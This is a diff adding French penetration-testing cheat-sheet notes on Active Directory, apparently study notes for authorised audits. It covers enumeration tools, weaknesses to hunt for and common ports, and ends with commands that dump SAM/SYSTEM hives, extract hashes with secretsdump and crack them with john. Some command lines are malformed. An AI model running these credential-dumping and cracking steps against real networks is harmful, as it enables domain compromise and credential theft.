@@ -1,0 +1,68 @@
+Boucle: Contexte → Vulnérabilité → Impact → Exploitation → Recommandation
+Phase  d’énumération et découverte : (group s, utilisateurs, partages  réseaux)   nmap,  enum4linux, smbclient, kerbrute, bloodhound, smbmap
+· Méthodologie  : Recherches de failles connues (mdp,versionss, défauts  configuration).
+· Exploitation : récupération d’information critiques
+· élévation  privilèges pour prendre  contrôle  du System .
+--
+search for:
+SMB anonyme
+
+Mots de passe faibles
+
+AS-REP Roasting
+
+Kerberoasting
+
+Partages trop permissifs
+
+Comptes de service mal protégés
+
+Admin local réutilisé
+
+WinRM/RDP exposé
+
+Absence de segmentation réseau
+
+Absence de journalisation
+---
+53 DNS
+
+88 Kerberos
+
+135 RPC
+
+139 / 445 SMB
+
+389 LDAP
+
+636 LDAPS
+
+3268 Global Catalog
+
+5985 WinRM
+
+3389 RDP
+---
+dig @ip domain.local
+---
+smbclient -L //ip -N
+smbclient -L //ip -N
+---
+
+nmap -sn ip
+nmap -p- -A -nP ip
+enum4linux -a ip
+--
+bloodhound-python -d domaine.local -u user -p pass -c All
+bloodhound-python -u user -p pwd -d domain -c all -ns ip
+nslookup
+vbe-decoder
+---
+smbmap -H ip -d domain -u "" -p ""
+smbclient//ip/sharedfolder$ -U ""
+---
+reg save hklm\system \SYSTEM(sam)
+smbclient //ip/share -U "Administrator" wget smb://ip/share/SAM wget smb://ip/share/SYSTEM
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL > hash.txt
+
+john --min-length=6 hash.txt
